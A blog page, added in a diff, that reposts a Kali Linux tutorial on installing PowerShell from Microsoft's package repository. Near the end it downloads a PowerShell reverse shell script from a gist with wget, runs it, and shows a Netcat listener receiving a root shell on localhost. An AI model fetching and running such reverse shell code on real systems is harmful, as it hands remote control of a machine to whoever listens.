@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Installing PowerShell on Kali Linux</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Installing PowerShell on Kali Linux</h1>
+			<b><time>06.06.2018 00:00</time></b>
+		       
+
+			<div>
+				<h1 id="installing-powershell-on-kali-linux">Installing PowerShell on Kali Linux</h1>
+<p><a href="https://www.kali.org/blog/installing-powershell-on-kali-linux/images/powershell-on-kali-linux-v3.jpg">https://www.kali.org/blog/installing-powershell-on-kali-linux/images/powershell-on-kali-linux-v3.jpg</a></p>
+<p>UPDATE NOV 2019 This post is out of date as of 2019 as powershell has been added to the primary repos. Just do a: apt update &amp;&amp; apt -y install powershell And you will have powershell on your system. Old Post You may already be aware that you can safely add external repositories to your</p>
+<h2 id="update-nov-2019"><strong>UPDATE NOV 2019</strong></h2>
+<p>This post is out of date as of 2019 as powershell has been added to the primary repos. Just do a:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apt update <span style="color:#f92672">&amp;&amp;</span> apt -y install powershell
+</span></span></code></pre></div><p>And you will have powershell on your system.</p>
+<h3 id="old-post">Old Post</h3>
+<p>You may already be aware that you can safely <a href="https://www.kali.org/blog/advanced-package-management-in-kali-linux/">add external repositories to your Kali Linux installation</a> but you may not be aware that one of the many repositories available online includes one from Microsoft that includes <a href="https://github.com/PowerShell/PowerShell">PowerShell</a>. The repository is for Debian but its packages install perfectly well on Kali, as we will show in this post.</p>
+<h3 id="powershell-package-installation-in-kali">PowerShell Package Installation in Kali</h3>
+<p>We begin by installing the necessary dependencies, most of which should already be installed in your Kali installation by default:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apt update <span style="color:#f92672">&amp;&amp;</span> apt -y install curl gnupg apt-transport-https
+</span></span></code></pre></div><p>Next, we need to download and add the public repository GPG key so APT will trust the packages and alert you to any issues with package signatures:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -
+</span></span></code></pre></div><p>With the GPG key added, we proceed to add the Microsoft package repository to its own package list file under <strong>/etc/apt/sources.list.d/</strong> and update the list of available packages:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main&#34;</span> &gt; /etc/apt/sources.list.d/powershell.list
+</span></span><span style="display:flex;"><span>apt update
+</span></span></code></pre></div><p>Finally, we proceed to install the powershell package:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apt -y install powershell
+</span></span></code></pre></div><h3 id="running-powershell">Running PowerShell</h3>
+<p>When the package installation completes, running <strong>pwsh</strong> will start up PowerShell, presenting us with the familiar “PS” prompt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# pwsh
+</span></span><span style="display:flex;"><span>PowerShell v6.1.0-preview.2
+</span></span><span style="display:flex;"><span>Copyright (c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>https://aka.ms/pscore6-docs
+</span></span><span style="display:flex;"><span>Type &#39;help&#39; to get help.
+</span></span><span style="display:flex;"><span>PS /root&gt;
+</span></span></code></pre></div><p>If you’re new to PowerShell, one of the first things you will likely want to do is update the built-in help, which can be done by running the <strong>Update-Help</strong> Cmdlet. This may take a little while to complete but only really needs to be run once in a rare while:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>PS /root&gt; Update-Help
+</span></span><span style="display:flex;"><span>Updating Help for module Microsoft.PowerShell.Utility
+</span></span><span style="display:flex;"><span>Locating Help Content...
+</span></span></code></pre></div><p>As you might expect, you won’t find all the commands you’re used to when using PowerShell on Windows but all of the core modules are present and the code is under constant development and improvement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>PS /root&gt; Get-Process -Name gnome*
+</span></span><span style="display:flex;"><span>NPM(K) PM(M) WS(M) CPU(s) Id SI ProcessName
+</span></span><span style="display:flex;"><span>------ ----- ----- ------ -- -- -----------
+</span></span><span style="display:flex;"><span>0 0.00 5.71 0.03 1073 072 gnome-keyring-d
+</span></span><span style="display:flex;"><span>0 0.00 9.80 0.19 659 649 gnome-session-b
+</span></span><span style="display:flex;"><span>0 0.00 13.72 0.36 1089 080 gnome-session-b
+</span></span><span style="display:flex;"><span>0 0.00 110.06 3.36 778 649 gnome-shell
+</span></span><span style="display:flex;"><span>0 0.00 277.15 27.85 1170 080 gnome-shell
+</span></span><span style="display:flex;"><span>0 0.00 11.77 0.09 1199 075 gnome-shell-cal
+</span></span><span style="display:flex;"><span>0 0.00 77.79 4.58 1381 080 gnome-software
+</span></span><span style="display:flex;"><span>0 0.00 36.58 2.03 1646 646 gnome-terminal-
+</span></span></code></pre></div><p>One of the surprising things you <em>can</em> do however, is use PowerShell to send a reverse shell to a Netcat listener. We came across a <a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1">small PowerShell reverse shell</a> online and much to our surprise, it happily connected back to our listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# pwsh
+</span></span><span style="display:flex;"><span>PowerShell v6.1.0-preview.2
+</span></span><span style="display:flex;"><span>Copyright (c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>https://aka.ms/pscore6-docs
+</span></span><span style="display:flex;"><span>Type &#39;help&#39; to get help.
+</span></span><span style="display:flex;"><span>PS /root&gt; wget -q https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
+</span></span><span style="display:flex;"><span>PS /root&gt; ./mini-reverse.ps1
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>root@kali:~# nc -lvnp 413
+</span></span><span style="display:flex;"><span>listening on [any] 413 ...
+</span></span><span style="display:flex;"><span>connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59006
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>Linux kali 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64 GNU/Linux
+</span></span></code></pre></div><p>We think it’s remarkable that, not only did Microsoft Open-source PowerShell, they’ve also been constantly updating and improving it, and having a public package repository for it makes installation a breeze.</p>
+<h4 id="source"><a href="https://www.kali.org/blog/installing-powershell-on-kali-linux/">Source</a></h4>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-21-cve-2025-30345---openslides-cross-site-/">CVE-2025-30345 - OpenSlides Cross-Site Scripting XSS</a></li>
+				
+				<li><a href="/posts/2025-03-21-cve-2025-30342---openslides-cross-site-/">CVE-2025-30342 - OpenSlides Cross-Site Scripting XSS</a></li>
+				
+				<li><a href="/posts/2025-03-21-cve-2025-30343---openslides-directory-t/">CVE-2025-30343 - OpenSlides Directory Traversal Vulnerability</a></li>
+				
+				<li><a href="/posts/2025-03-21-cve-2025-30344---openslides-timing-base/">CVE-2025-30344 - OpenSlides Timing-Based Authentication Bypass</a></li>
+				
+				<li><a href="/posts/2025-03-21-cve-2024-50053---zohocorp-manageengine-/">CVE-2024-50053 - Zohocorp ManageEngine ServiceDesk Plus Stored Cross-Site Scripting</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
